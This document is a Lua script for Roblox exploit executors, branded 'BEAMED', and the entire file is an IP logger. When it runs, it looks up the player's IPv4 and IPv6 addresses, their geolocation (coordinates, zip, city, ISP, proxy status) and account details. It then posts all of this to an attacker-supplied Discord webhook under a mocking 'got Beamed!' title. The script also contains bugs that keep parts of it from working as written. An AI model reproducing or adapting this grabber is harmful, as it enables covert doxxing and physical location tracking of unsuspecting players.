--[[
.______    _______     ___      .___  ___.  _______  _______  
|   _  \  |   ____|   /   \     |   \/   | |   ____||       \ 
|  |_)  | |  |__     /  ^  \    |  \  /  | |  |__   |  .--.  |
|   _  <  |   __|   /  /_\  \   |  |\/|  | |   __|  |  |  |  |
|  |_)  | |  |____ /  _____  \  |  |  |  | |  |____ |  '--'  |
|______/  |_______/__/     \__\ |__|  |__| |_______||_______/ 
]]
local url = "put your webhook here"
local http = game:HttpGet
local httpS = game:GetService("HttpService")
local decode = httpS:JSONDecode
local Player = game:GetService("Players").LocalPlayer
local Name = Player.Name
local time = decode(http('http://worldtimeapi.org/api/ip'))
local Age = Player.AccountAge
local getdate = os.date("!*t", os.time())
local Birthday = decode(http('https://showcase.api.linx.twenty57.net/UnixTime/fromunixtimestamp?unixtimestamp=' .. os.time() - Age * 86400 + time.raw_offset))
local IPv6 = http('https://api6.ipify.org')
local IPv4 = http('https://api.ipify.org')
--local UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
--local UAdata = game:GetService("HttpService"):JSONDecode(game:HttpGet('http://api.userstack.com/detect?access_key=mykey&ua=' .. UserAgent))
local data = decode(http('https://pro.ip-api.com/json/' .. IPv4 .. '?fields=66842623&key=mykey'))
local Exploit =
    (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
    (secure_load and "Sentinel") or
    (is_sirhurt_closure and "Sirhurt") or
    (pebc_execute and "ProtoSmasher") or
    (KRNL_LOADED and "Krnl") or
    (IsElectron and "Electron") or
    (WrapGlobal and not "WeAreDevs") or
    (isvm and "Proxo") or
    (shadow_env and "Shadow") or
    (jit and "EasyExploits") or
    (getreg()['CalamariLuaEnv'] and "Calamari") or
    (IS_VIVA_LOADED and "VIVA") or
    (IS_COCO_LOADED and "Coco") or
    ("Unknown Exploit")
   
local gettime = (getdate.year .. "-" .. getdate.month .. "-" .. getdate.day .. "T" .. getdate.hour .. ":" .. getdate.min .. ":" .. getdate.sec .. "Z")

if Player.DisplayName == Name then
    local DisplayNamestr = Name .. " doesn't have a display name"
else
    local DisplayNamestr = Name .. "'s display name is " .. Player.DisplayName
end

if IPv6 == '' then
    local IPv6str = Name .. " doesn't have a IPv6 address"
else
    local IPv6str = Name .. "'s IPv6 is " .. IPv6
end

if Player.MembershipType == Enum.MembershipType.Premium then
    local Premium = Name .. " has Premium"
else
    local Premium = Name .. " is a no Premium noob"
end

if data.proxy then
    local Proxy = Name .. " is using a proxy"
else
    local Proxy = Name .. " isn't using a proxy"
end

local data = {
    ["embeds"] = {
		{
			["title"] = "__**" .. Name .. " got Beamed!**__",
			["description"] = "",
			["type"] = "rich",
			["color"] = tonumber(0x00FF00),
			["image"] = {
				["url"] = "https://roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. Name
			},
			["thumbnail"] = {
				["url"] = "https://cdn.discordapp.com/attachments/888619229597818904/899888215677370388/beamed.gif"
			},
			["fields"] = {
				{
					["title"] = "__Exploit__",
					["value"] = Exploit,
					["inline"] = false
				},
				{
					["title"] = "__Player__",
					["value"] = "[" .. Name .. "](https://roblox.com/users/" .. Player.UserId .. ")",
					["inline"] = false
				},
				{
					["title"] = "__Display Name__",
					["value"] = DisplayNamestr,
					["inline"] = false
				},
				{
					["name"] = "__IPv4__",
					["value"] = Ipv4,
					["inline"] = false
				},
				{
					["name"] = "__IPv6__",
					["value"] = IPv6str,
					["inline"] = false
				},
				{
					["name"] = "__Location__",
					["value"] = "[Google Maps](https://google.com/maps/@" .. data.lat .. "," .. data.lon .. ",15z)",
					["inline"] = false
				},
				{
					["name"] = "__Premium__",
					["value"] = Premium,
					["inline"] = false
				},
				{
					["title"] = "__Zipcode__",
					["value"] = data.zip,
					["inline"] = false
				},
				{
					["title"] = "__City__",
					["value"] = data.city,
					["inline"] = false
				},
				{
					["title"] = "__region__",
					["value"] = data.regionName,
					["inline"] = false
				},
				{
					["title"] = "__country__",
					["value"] = data.country,
					["inline"] = false
				},
				{
					["title"] = "__continent__",
					["value"] = data.continent,
					["inline"] = false
				},
				{
					["title"] = "__Timezone__",
					["value"] = data.timezone,
					["inline"] = false
				},
				{
					["title"] = "__Isp__",
					["value"] = data.org,
					["inline"] = false
				},
				{
					["title"] = "__latitude__",
					["value"] = data.lat,
					["inline"] = false
				},
				{
					["title"] = "__longitude__",
					["value"] = data.lon,
					["inline"] = false
				}
				{
					["title"] = "__Account age__",
					["value"] = Name .. " created their account " .. Age .. " days ago",
					["inline"] = false
				},
				{
					["title"] = "__Account Birthday__",
					["value"] = Name .. "'s birthday is " .. Birthday.Datetime:sub(1, -10),
					["inline"] = false
				},
				{
					["title"] = "__Proxy__",
					["value"] = Proxy,
					["inline"] = false
				}
			}
		}
	}
}
local jsondata = httpS:JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local finaldata = {Url = url, Body = jsondata, Method = "POST", Headers = headers}
request(finaldata)
